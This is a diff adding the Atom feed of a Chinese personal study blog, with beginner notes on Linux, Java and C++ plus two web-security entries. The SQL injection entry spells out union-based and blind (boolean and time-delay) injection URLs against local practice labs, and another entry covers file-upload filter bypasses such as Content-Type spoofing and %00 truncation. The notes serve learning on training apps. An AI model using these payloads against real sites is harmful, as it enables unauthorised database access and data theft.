@@ -1,0 +1,792 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://xiahexingkong.github.io</id>
+    <title>夏河星空的小站</title>
+    <updated>2022-11-05T15:42:26.772Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://xiahexingkong.github.io"/>
+    <link rel="self" href="https://xiahexingkong.github.io/atom.xml"/>
+    <subtitle>温故而知新，我学ABC!</subtitle>
+    <logo>https://xiahexingkong.github.io/images/avatar.png</logo>
+    <icon>https://xiahexingkong.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, 夏河星空的小站</rights>
+    <entry>
+        <title type="html"><![CDATA[Linux学习之路]]></title>
+        <id>https://xiahexingkong.github.io/post/linux-xue-xi-zhi-lu/</id>
+        <link href="https://xiahexingkong.github.io/post/linux-xue-xi-zhi-lu/">
+        </link>
+        <updated>2022-07-07T13:19:41.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<p>相对路径与绝对路径的使用</p>
+<pre><code>cd ../../var/log/samba  //使用的相对路径，向上两层，向下到samba
+cd /var/log/samba       //使用的绝对路径，路径全写
+cd ..                                 //切换到上一级目录
+cd .                                  //切换到当前目录
+cd ~                                //切换到用户家目录
+cd -                                 //切换到上一次工作的目录
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WEB-文件处理漏洞]]></title>
+        <id>https://xiahexingkong.github.io/post/web-wen-jian-chu-li-lou-dong/</id>
+        <link href="https://xiahexingkong.github.io/post/web-wen-jian-chu-li-lou-dong/">
+        </link>
+        <updated>2022-04-12T09:16:38.000Z</updated>
+        <summary type="html"><![CDATA[<p>文件上传，下载漏洞</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>文件上传，下载漏洞</p>
+<!-- more -->
+<p>文件上传：<br>
+客户端绕过：<br>
+1.网页js代码的检测：使用开发者选项破坏网页的前段检测</p>
+<pre><code class="language-javascript">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;
+                &lt;p&gt;请选择要上传的图片：&lt;p&gt;
+                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;
+                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;
+&lt;/form&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    function checkFile() {
+        var file = document.getElementsByName('upload_file')[0].value;
+        if (file == null || file == &quot;&quot;) {
+            alert(&quot;请选择要上传的文件!&quot;);
+            return false;
+        }
+        //定义允许上传的文件类型
+        var allow_ext = &quot;.jpg|.png|.gif&quot;;
+        //提取上传文件的类型
+        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+        //判断上传文件类型是否允许上传
+        if (allow_ext.indexOf(ext_name) == -1) {
+            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+            alert(errMsg);
+            return false;
+        }
+    }
+&lt;/script&gt;
+</code></pre>
+<pre><code>        服务器绕过：
+        1.通过验证 Content-Type类型来达到检测上传文件类型，
+        ![](https://xiahexingkong.github.io/post-images/1650687379657.jpg)
+        @修改POST中Content-Type达到绕过黑名单的效果
+        “00”截断：
+        通过修改URL的解析路径通过添加“%00”（有时需要通过16进制转码达到添加00）达到截断文件的名称
+        使用场景：1.上传路径可控（可知）2.PHP版本小于5.3.4,且php的magic_quotes_gpc处于OFF</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WEB-SQL注入 ]]></title>
+        <id>https://xiahexingkong.github.io/post/web-sql-zhu-ru/</id>
+        <link href="https://xiahexingkong.github.io/post/web-sql-zhu-ru/">
+        </link>
+        <updated>2022-04-05T12:54:13.000Z</updated>
+        <content type="html"><![CDATA[<p>sql注入原理：在网页代码里存在拼接形式的可以执行的sql语句。<br>
+<img src="https://xiahexingkong.github.io/post-images/1649941988836.jpg" alt="" loading="lazy"><br>
+我们想办法构建一个我们想要网页后台执行我们预设指令的。<br>
+1.我们提交的浏览器请求会被当成会被当成字符串去处理了：</p>
+<pre><code class="language-PHP">$query=&quot;select id,email from member where username='$name'&quot;;//这里的变量是字符型，需要考虑闭合
+select id,email from member where username='$name'
+//这里提交含有单引号'的name破坏原有的网页代码，使得我们提交的单引号与 网页的单引号闭合；
+//我们提交如下指令
+select id,email from member where username='abc';seleect database();'
+//注意：PHP只能执行一条sql，使用 union链接两个sql语句变成一个
+union 前后语句返回的列要一致，使用order by 数字测试
+http://192.168.56.1/pikachu/vul/sqli/sqli_str.php?name=-1' order by 2 --+&amp;submit=%E6%9F%A5%E8%AF%A2
+//浏览器会编码转换我们的提交请求使用HackBar提交请求
+</code></pre>
+<p>获取数据库-库名⬇️</p>
+<pre><code>http://192.168.56.1/pikachu/vul/sqli/sqli_str.php?name=-1' union select 1,database() --+&amp;submit=%E6%9F%A5%E8%AF%A2
+</code></pre>
+<p><img src="https://xiahexingkong.github.io/post-images/1649947024562.jpg" alt="" loading="lazy"><br>
+获取数据库-表名⬇️</p>
+<pre><code>http://192.168.56.1/pikachu/vul/sqli/sqli_str.php?name=-1' union select 1,group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA='pikachu'  --+&amp;submit=%E6%9F%A5%E8%AF%A2
+//使用group_concat将多个行的结果拼接成一行显示
+</code></pre>
+<p><img src="https://xiahexingkong.github.io/post-images/1649947047033.jpg" alt="" loading="lazy"><br>
+获取数据库-列名⬇️</p>
+<pre><code>http://192.168.56.1/pikachu/vul/sqli/sqli_str.php?name=-1' union select 1,group_concat(column_name) from information_schema.columns where TABLE_SCHEMA='pikachu' and table_name='users'  --+&amp;submit=%E6%9F%A5%E8%AF%A2
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xiahexingkong.github.io/post-images/1649946593173.jpg" alt="" loading="lazy"></figure>
+<p>sql注入流程：<br>
+1.初步判断是否存在漏洞：使用单引号或其他sql语句引起网页sql系统报错<br>
+2.判断数据库系统（数据库不同，语句不同）<br>
+3.获取库名，表名，列名<br>
+基于布尔的时间盲注：<br>
+使用场景：数据没有回传到页面前端，但是会有正确与错误的不同表示<br>
+原理：使用sql对于真假情况返回不同的情况进行试错形式的真假判断得出想要的结果<br>
+1.获取库名的长度：length函数<br>
+注入代码示例：真值'and length(database())&gt;=7 #<br>
+2.枚举猜测字符：ASCII函数，MID函数，substr函数（截取字符串某一指定位置的字符）截取字符进行布尔判断<br>
+代码示例：真值'and ascii(substr(database(),1,1))=112#//此处可以使用二分思想加快判断<br>
+3.获取表名<br>
+代码示例：</p>
+<pre><code>http://192.168.43.63/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=database() limit 2,1),3,1))=115 --+
+//尝试第3个表名的第3个字母的ascii是不是155
+</code></pre>
+<p>4.获取列名<br>
+代码示例：</p>
+<pre><code>http://192.168.43.63/sqli-labs/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where TABLE_SCHEMA='security' and table_name='users' limit 0,1),1,1))=105 --+
+//尝试第1个列名的第1个字母的ascii是不是105
+</code></pre>
+<p>5.获取指定表-列-行的数据<br>
+代码示例：</p>
+<pre><code>http://192.168.43.63/sqli-labs/Less-5/?id=1' and ORD(MID((select IFNULL(CAST(username as CHAR),0x20) from  security.users ORDER BY id limit 0,1),1,1))=68 --+
+//尝试security.users中的id第1行的第一个字母 ascii是不是68
+</code></pre>
+<p>基于时间延迟的布尔盲注：<br>
+使用场景：不再有正确或错误的提示，仅有一种返回提示<br>
+实现原理：使用sleep函数，if函数对布尔判断进行睡眠返回（网页返回时间的差判断等价于布尔判断）<br>
+1.获取数据库名长度<br>
+代码示例：<br>
+http://192.168.43.63/sqli-labs/Less-9/?id=1' and if(length(database())=8,sleep(3),0) --+<br>
+//库名长度为8睡眠3秒，反之不睡眠<br>
+2.获取库名<br>
+代码示例：<br>
+http://192.168.43.63/sqli-labs/Less-9/?id=1' and if(ascii(substr((select database()),1,1))=115,sleep(5),0) --+</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JAVA继承①]]></title>
+        <id>https://xiahexingkong.github.io/post/java-ji-cheng/</id>
+        <link href="https://xiahexingkong.github.io/post/java-ji-cheng/">
+        </link>
+        <updated>2022-03-23T08:34:33.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<pre><code class="language-java">public class Friut(){
+    private String name;
+    private String color;
+    public Friut(){
+        name=&quot;***&quot;;
+        color=&quot;red&quot;;
+    }
+    public String getName(){
+        return name;
+    }
+
+}
+
+</code></pre>
+<p>访问权限：<br>
+1.类的访问权限：public，缺省<br>
+public类导入后任何时候皆可以使用<br>
+缺省在某些情况下无法使用，例如在不同一个包不可以访问<br>
+//不同包层访问类需要import导入<br>
+2.成员的访问权限：public，private，protected，缺省<br>
+public：类可以访问，就可以访问<br>
+private：只能在本类中访问<br>
+protected：不同包不可访问，Apple可以直接继承color，在本类中不可对象.成员使用<br>
+缺省：不同包Apple不能直接继承，也不能直接使用</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[数组小计]]></title>
+        <id>https://xiahexingkong.github.io/post/shu-zu-xiao-ji/</id>
+        <link href="https://xiahexingkong.github.io/post/shu-zu-xiao-ji/">
+        </link>
+        <updated>2022-03-20T02:21:56.000Z</updated>
+        <content type="html"><![CDATA[<pre><code class="language-C++">//一维数组定义
+    int n=100;
+    int number[n];//c中不可以使用变量定义数组长度
+    int years[6]={2012,2013,2014,2015,2016,2017};//前后声明一致
+    int months[12]={1,3,5,7,9};//未赋值则整型默认初始化为0
+    int days[]={1,15};//C++11标准中：int days[]{1,15};float m[100]{};
+</code></pre>
+<pre><code class="language-C++">//动态输入信息并赋值
+    const int N=5;
+    int nums[N];
+    cout&lt;&lt;&quot;数组的大小：&quot;&lt;&lt;sizeof(nums)/sizeof(int)&lt;&lt;endl;//可以计算数组长度(string类型无效)
+    for(int i=;i&lt;sizeof(nums)/sizeof(int);i++){
+        cout&lt;&lt;&quot;请输入第&quot;&lt;&lt;(i+1)&lt;&lt;&quot;个数组元素&quot;&lt;&lt;endl;
+        cin&gt;&gt;nums[i];
+    }
+</code></pre>
+<pre><code class="language-C++">//数组查找
+    int nums[]={8,4,12,32,485,123};
+    int numsLengs=sizeof(nums)/sizeof(int);
+    int searchNum;
+    int searchIndex=-1;//搜索标记变量
+    cin&gt;&gt;searchNum;
+    for(int i=0;i&lt;numsLengs;i++){
+        if(nums[i]==searchNum){
+            searchIndex=i;
+        }
+    }
+    //检查搜索标志是否改变
+    if(searchIndex==-1){
+        cout&lt;&lt;&quot;未搜索到指定数字&quot;&lt;&lt;endl;
+    }else{
+        cout&lt;&lt;&quot;成功找到:&quot;&lt;&lt;searchIndex&lt;&lt;endl;
+    }
+</code></pre>
+<pre><code class="language-C++">//冒泡排序
+    int nums[]={8,4,12,32,485,123};
+    int leng=sizeof(nums)/sizeof(nums[0]);
+    cout&lt;&lt;leng&lt;&lt;endl;
+    int temp;
+    for(int i=0;i&lt;leng-1;i++){          //需要进项5次冒泡,一次循环出现一次结果(类似实时打榜)
+        for(int j=0;j&lt;leng-1-i;j++){    //需注意对循环变量的控制，每出现一个结果减少一次冒泡交换
+            if(nums[j]&lt;nums[j+1]){      //冒泡交换
+                temp=nums[j];
+                nums[j]=nums[j+1];
+                nums[j+1]=temp;
+                cout&lt;&lt;nums[j]&lt;&lt;&quot;\t&quot;&lt;&lt;nums[j+1]&lt;&lt;&quot;\t&quot;&lt;&lt;&quot;第&quot;&lt;&lt;j+1&lt;&lt;&quot;次&quot;&lt;&lt;endl;
+            }
+        }
+    }
+    cout&lt;&lt;&quot;输出排序结果&quot;&lt;&lt;endl;
+    for(int i=0;i&lt;leng;i++){
+        cout&lt;&lt;nums[i]&lt;&lt;&quot;\t&quot;;
+    }
+</code></pre>
+<pre><code class="language-C++">//选择排序
+    int nums[]={8,4,12,32,485,123};
+    int leng=sizeof(nums)/sizeof(nums[0]);
+    cout&lt;&lt;leng&lt;&lt;endl;
+    int min=nums[0];//假定第一位为最小值
+    int minIndex=0;
+    int temp;
+    for(int i=0;i&lt;leng-1;i++){
+        min=nums[i];//每次新定榜首(拿过榜首的除外)
+        minIndex=i;
+        for(int j=i+1;j&lt;leng;j++){
+            if(nums[j]&lt;nums[i]){//最小值比较,谁小谁为王
+                min=nums[j];
+                minIndex=j;
+                //榜上有名，记录上榜
+            }
+        }//循环结束本轮榜首出现，原榜首下去吧你
+        if(minIndex!=i){//利用榜名检测是否需要交换
+            temp=nums[i];
+            nums[i]=nums[minIndex];
+            nums[minIndex]=temp;
+        }
+        cout&lt;&lt;nums[i]&lt;&lt;&quot;\t&quot;&lt;&lt;&quot;\t&quot;&lt;&lt;&quot;第&quot;&lt;&lt;i+1&lt;&lt;&quot;次&quot;&lt;&lt;endl;
+    }
+    cout&lt;&lt;&quot;输出排序结果&quot;&lt;&lt;endl;
+    for(int i=0;i&lt;leng;i++){
+        cout&lt;&lt;nums[i]&lt;&lt;&quot;\t&quot;;
+    }
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WEB（1）]]></title>
+        <id>https://xiahexingkong.github.io/post/web1/</id>
+        <link href="https://xiahexingkong.github.io/post/web1/">
+        </link>
+        <updated>2022-03-18T12:51:59.000Z</updated>
+        <summary type="html"><![CDATA[<p>关于index.php的备份文件名</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>关于index.php的备份文件名</p>
+<!-- more -->
+<p>index.php:<br>
+如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件,通过文本方式打开查看代码</p>
+<p>cookie：<br>
+浏览网页时web服务器传给终端的类似登陆令牌之类的文件（例：设备免密登录的实现）<br>
+···/cookie.php为网站的cookie文件，可通过开发者工具选项查看cookie的<br>
+HTML:<br>
+不能按的按钮：源代码如下<br>
+<img src="https://xiahexingkong.github.io/post-images/1647649363285.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JAVA语言(4)]]></title>
+        <id>https://xiahexingkong.github.io/post/java4/</id>
+        <link href="https://xiahexingkong.github.io/post/java4/">
+        </link>
+        <updated>2022-01-29T08:57:33.000Z</updated>
+        <summary type="html"><![CDATA[<p>⭐️函数</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>⭐️函数</p>
+<!-- more -->
+<p>Java的函数必须定义在类的内部，成为类的成员。<br>
+定义函数：</p>
+<pre><code>&lt;返回类型&gt; &lt;方法名称&gt;(&lt;参数表&gt;) {
+	&lt;方法体&gt;
+}
+</code></pre>
+<p>返回类型是这个函数运行结束时要返回给调用者的数据的类型，函数可以返回基本数据类型、对象或者void。返回void表示这个函数不返回任何值。函数名称是一个Java名字，一样要遵循和变量一样的命名规则。参数表是0个或1个或多个参数定义，用逗号&quot;,&quot;分隔。<br>
+在这个阶段，我们要在所有的函数的返回类型前面加上关键字“static”。static表示这个函数属于这个类，而不属于这个类的任何对象，因此我们才可以不制造这个类的对象，而直接从main()函数中调用它。<br>
+当一个函数被调用时，程序就转到这个函数中去运行，函数体里的语句就一条一条地被调用。一旦函数运行结束，就又回到调用它的地方去继续运行。</p>
+<pre><code>//函数定义
+public static void sum(int a,int b){//和主函数平起平坐
+    //&lt;返回类型&gt; &lt;方法名称&gt;(&lt;参数表&gt;)
+    int i;
+    int sum=0;
+    for(i=a;i&lt;=b;i++){
+        sum+=i;
+    }
+    System.out.println(&quot;a+b=&quot;+sum);
+}
+public static void main(String[] args){
+    Scanner in=new Scanner(System.in);
+    //要引入import java.util.Scanner;
+    int x=in.nextInt(),y=in.nextInt();
+    sum(x,y);
+}
+</code></pre>
+<pre><code>//参数传值
+int a=5;//字面量
+int c;//变量
+c=max(10,12);//函数的返回值
+System.out.println(max(10,12));//计算结果
+//类型不匹配
+//当函数期望的参数类型比调用函数时给的值的类型宽的时候，编译器能悄悄替你把类型转换好
+//char-&gt;int -&gt;double
+//当与上述情况相反时需要你写强制类型转换
+//(int )5.0
+//不满足上述两种情况时，类型无法转换
+//传值
+public void swap(int a,int b){
+    //此处的int a, int b为参数
+}
+swap(10,12);//此处为“值”
+//本地变量，定义在函数内部的变量就是本地变量
+    //参数也是本地变量
+//变量的生存周期和作用域
+    //生存期:什么时候这个变量开始出现，到什么时候它消亡了
+    //作用域:在(代码)什么范围内可以访问这个变量(这个变量可以起作用)
+    //对于本地变量:大括号内——块
+//本地变量的规则
+    //本地变量的定义在块内
+            //它可以是定义在函数的块内
+            //也可以是定义在语句的块内
+            //甚至可以随便拉一对大括号来定义变量
+    //程序运行进入这个块之前，其中的变量是不存在的，离开这个块，其中的变量就会消失
+    //块外面定义的变量在里面仍然有效
+    //不能在一个块内定义同名变量，也不能定义块外面的定义过的变量
+    //本地变量不会被默认初始化
+    //参数在进入函数的时候被初始化了
+int main(){
+    int scp1;
+    //scp1出现了
+    {                //scp1还存在
+        int scp2;
+        //scp2出现了
+        {             //scp1与scp2还存在
+            int scp3;
+            //scp1,scp2,scp3都存在
+        }
+        //scp3消失了，scp1，scp2都存在
+    }
+    //scp2消失了，scp1存在
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JAVA语言(3)]]></title>
+        <id>https://xiahexingkong.github.io/post/java3/</id>
+        <link href="https://xiahexingkong.github.io/post/java3/">
+        </link>
+        <updated>2022-01-29T08:57:31.000Z</updated>
+        <summary type="html"><![CDATA[<p>⭐️使用对象：字符类型，包裹类型，MATH类</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>⭐️使用对象：字符类型，包裹类型，MATH类</p>
+<!-- more -->
+<p>字符类型<br>
+单个字符类型:char<br>
+用单引号表示的字符字面量(?)：'a','1'<br>
+Java使用Unicode来表示字符（包括汉字）<br>
+例：</p>
+<pre><code>char c='A';//char c='\u0041';char c=65;//三种表示'A'
+c++;//'A'字符加一个数字得到Unicode码表后一个字符'B'
+System.out.println(c);
+char d='D';
+int i=d-c;//i='Z'-'A';//两个字符的减得到他们在码表中的距离
+System.out.print(d-c);
+//
+</code></pre>
+<p>字符大小(Unicode编号顺序)：<br>
+0<sub>9A</sub>Za~z<br>
+Z&lt;a<br>
+大小写转换：</p>
+<pre><code>char a='c';//
+char d=(char)(a+'A'-'a');//得到两者间的距离
+//char d=(char)(a+'a'-'A');得到小写字母
+System.out.print(d);//得到大写字母
+</code></pre>
+<p>逃逸字符</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">意义</th>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">\b</td>
+<td style="text-align:center">回退一格</td>
+<td style="text-align:center">\&quot;</td>
+<td style="text-align:center">双引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\t</td>
+<td style="text-align:center">到下一个表格位</td>
+<td style="text-align:center">\'</td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\n</td>
+<td style="text-align:center">换行</td>
+<td style="text-align:center">\|反斜杠本身</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">\r</td>
+<td style="text-align:center">回车</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">⭐️包裹类型</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">基础类型(初始值)</td>
+<td style="text-align:center">包裹类型</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">:-:</td>
+<td style="text-align:center">:-:</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">boolean(false)</td>
+<td style="text-align:center">Boolean</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">char(空格)</td>
+<td style="text-align:center">Character</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">int(0)</td>
+<td style="text-align:center">Integer🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">double(0.0)</td>
+<td style="text-align:center">Double🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">byte(0)</td>
+<td style="text-align:center">Byte🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">short(0)</td>
+<td style="text-align:center">Short🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">long(0)</td>
+<td style="text-align:center">Long🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">float(0.0)</td>
+<td style="text-align:center">Float🏵</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">BigInteger</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">BigDecmail</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">注：BigInteger，BigDecmail没有对应的的基本类型，主要应用于高精度的运算</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">BigInteger:支持任意精度的整数；</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">BigDecmail支持任意精度带小数点的运算，主要用于金钱上的计算上。</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">带🏵为八大基本类型，但不是对象。</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<pre><code>Interger i=10;//Interger i=new Integer(10);Interger i=new Interger(&quot;10&quot;);
+Interger iii=10;
+int i=iii;//自动打包/解包
+System.out.println(Integer.MAX_VALUE);
+System.out.println(Character.toLowerCase('A'));//将该字符转化为小写
+//toUpperCase(char ch)把字符转化为大写
+//isDigit(char ch)判断字符是不是数字
+//isLetter(char ch)判断字符是不是字母
+//isLetterOrDigit(char ch)判断字符是不是字母或数字
+//isLowerCase(char ch)判断字符是不是小写字母
+//isUpperCase(char ch)判断字符是不是大写字母
+//isWhitespace(char ch)判断字符是不是一种空格
+</code></pre>
+<p>⭐️MATH类</p>
+<pre><code>        //abs（计算绝对值）
+System.out.println(Math.abs(-12));`
+        //pow（幂次运算,浮点型）
+System.out.println(Math.pow(2,3));
+        //random（随机数0~1）
+System.out.println(Math.random());
+        //round（四舍五入）
+System.out.println(10.646);
+</code></pre>
+<p>⭐️字符串<br>
+字符串变量和数组变量类似，它并不存放字符串，不是字符串的所有者，它是字符串的管理者。<br>
+Java的字符串还是一种特殊的“不可变”对象，所有的字符串操作都是产生一个新的字符串，而不是对原来的字符串的修改。</p>
+<pre><code>String s=new String(&quot;hellow&quot;);//字符串对象
+System.out.println(s+word);//字符串连接
+System.out.println(1+2+s);
+System.out.println(s+1+2);//自左向右运算s+12为String
+System.out.println(s+(1+2));
+Scanner in =new Scanner(System.in);
+s=in.next();//仅读取第一个单词（空格形式终止）（空格，tab，换行）
+System.out.println(s);
+s=in.nextLine();//读入一整行
+System.out.println(s);
+        //字符串相同比较:equals()
+s=&quot;abc&quot;;
+System.out.println(s==abc);//比较管理者是否相同
+System.out.print(s.equals(&quot;abc&quot;));//比较内容是否相同
+        //字符串大小比较（编码比较）:compareTo()
+String s1=&quot;abc&quot;;
+String s2=&quot;abcd&quot;;
+System.out.println(s1.compareTo(s2));
+//System.out.println(&quot;abc&quot;.compareTo(s2));
+        //字符串长度：length()
+String name=&quot;hellow&quot;, str1=&quot;one&quot;, str2=&quot;&quot;,str3;
+System.out.println(name);//str1=3,st2=0,str3报错未初始化
+        //访问String中单个字符：charAT()
+System.out.println(s1.charAT(2));//可用for循环遍历（不可for each）
+        //得到子串：substring(n)/substring(b,e)
+System.out.println(s1.substring(1))//从1号位置到最后
+System.out.println(s1.substring(0,2));//[0,2)不包含2
+        //寻找字符串：index0f
+String s1=&quot;asdfasdf&quot;;
+int loc=s1.indexOf('s');
+System.out.println(s1.indexOf('r'));//寻找指定字符位置
+System.out.println(s1.indexOf(&quot;df&quot;));//寻找指定字符串位置
+System.out.println(s1.indexOf('s',loc+1));//从loc+1位置寻找指定字符/串
+        //从右至左寻找
+System.out.println(s1.lastIndexOf('s'));
+System.out.println(s1.lastIndexOf('d',4));
+System.out.println(s1.lastIndexOf('d'));
+        //是否以指定字符串开头/结束
+System.out.println(s1.startsWith(&quot;s&quot;));
+System.out.println(s1.endsWith(&quot;s&quot;));
+        //删除两端空格
+System.out.println(&quot;   afsdf &quot;.trim());
+        //全部字符大写/小写
+System.out.println(s1.toUpperCase());
+System.out.println(s1.toLowerCase());
+        //指定c1换成c2;c1,c2类型一致
+System.out.println(s1.replace(&quot;a&quot;,&quot;wer&quot;));
+        //使用switch-case语句
+String s1=&quot;asd&quot;;
+int loc=s1.indexOf('s');
+switch(s1){
+    case &quot;as&quot;:
+        System.out.println(&quot;选择asd选项；&quot;);
+        break;
+    case &quot;asd&quot;:
+        System.out.println(&quot;选择as选项；&quot;);
+        break;
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JAVA语言(2)]]></title>
+        <id>https://xiahexingkong.github.io/post/java/</id>
+        <link href="https://xiahexingkong.github.io/post/java/">
+        </link>
+        <updated>2022-01-28T08:14:24.000Z</updated>
+        <summary type="html"><![CDATA[<p>⭐️数组,for each循环</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>⭐️数组,for each循环</p>
+<!-- more -->
+<p>🏳️‍🌈数组<br>
+🔶数组定义：</p>
+<pre><code>int[] a={12,12334,213};
+int b=scnner.nextInt();
+int[] a=new int [b];    //a为数组名,b为数组大小,是具体的数或整型变量
+                                    //new方式创建的数组有默认的0值
+</code></pre>
+<p>🔶数组的函数：</p>
+<pre><code>for(int i=0;i&lt;a.length;i++){
+    //方便的对指定的数组遍历
+}
+</code></pre>
+<p>🏴例：输入指定个数的整数，求出平均数，并将大于平均数的值输出。</p>
+<pre><code>Scanner in =new Scanner(System.in);
+int x=in.nextInt();
+double sum=0.0,avage;
+int [] numbers=new int [x];
+for(int i=0;i&lt;numbers.length;i++){//对数组的遍历，提高程序的可扩展性
+    int n=in.nextInt();
+    numbers[i]=n;
+    sum+=numbers[i];
+}
+avage=sum/x;
+for(int i=0;i&lt;numbers.length;i++){
+    if(numbers[i]&gt;=avage){
+        System.out.println(numbers[i]);
+    }
+}
+System.out.println(avage);
+</code></pre>
+<p>🔶数组的赋值：</p>
+<pre><code>int a[0]=8;
+int[] b=a;//赋值:传递的是地址；
+System.out.ptintln(b[0]);
+</code></pre>
+<p>🔶数组的拷贝：</p>
+<pre><code>int a[]={12,23,34,56};
+int[] b=new int[a.length];
+for(int i=0;i&lt;a.length;i++){
+    b[i]=a[i];
+}
+for(int i=0;i&lt;b.length;i++){
+    System.out.println(b[i]);
+}
+</code></pre>
+<p>🔶数组的遍历：</p>
+<pre><code>int a[]={12,23,34,45};
+for(int k: a){//foreach循环:每次从a中依次取一个数据传给k
+    System.out.println(k);
+}
+</code></pre>
+<p>🔶素数遍历判断：<br>
+例:输出100以内的素数。</p>
+<pre><code>boolean []numbers=new boolean[100];
+for(int i=0;i&lt;numbers.length;i++){
+    numbers[i]=true;
+}
+for(int i=2;i&lt;numbers.length;i++){
+    if(numbers[i]==true)
+        for(int j=2;j*i&lt;numbers.length;j++){
+            numbers[i*j]=false;
+        }
+}
+for(int i=2;i&lt;numbers.length;i++){
+    if(numbers[i]==true){
+        System.out.println(i);
+    }
+}
+</code></pre>
+<p>例:输出50个素数：</p>
+<pre><code>int []numbers=new int[50];
+numbers[0]=2;
+int cnt=1;
+OUT_for:
+for(int i=3;cnt&lt;50;i++){    //限制素数的个数
+    for(int j=0;j&lt;cnt;j++){
+        if(i%numbers[j]==0){
+            continue OUT_for;
+        }
+    }
+    numbers[cnt++]=i;
+}
+for(int k:numbers){
+    System.out.println(k);
+}
+</code></pre>
+<p>🏳️</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JAVA语言(1)]]></title>
+        <id>https://xiahexingkong.github.io/post/java-yu-yan/</id>
+        <link href="https://xiahexingkong.github.io/post/java-yu-yan/">
+        </link>
+        <updated>2022-01-27T08:38:16.000Z</updated>
+        <summary type="html"><![CDATA[<p>⭐️for循环，boolean类型</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>⭐️for循环，boolean类型</p>
+<!-- more -->
+<p>🏳️‍🌈for循环<br>
+例：输出100以内的素数。</p>
+<pre><code>for(int n=2;n&lt;100;n++){
+    int flag=0;
+    for(int i=2;i*i&lt;=n;i++){
+        if(n%i==0){
+            flag=1; //当判断n为质数，标记
+            break;  //跳出当前循环判断下一个n
+        }
+    }
+    if(flag==1){    //根据判断n是否被标记来输出
+    }
+    else{
+        System.out.println(n+&quot;是素数&quot;);
+    }
+}
+</code></pre>
+<p>例：输出前50个素数。</p>
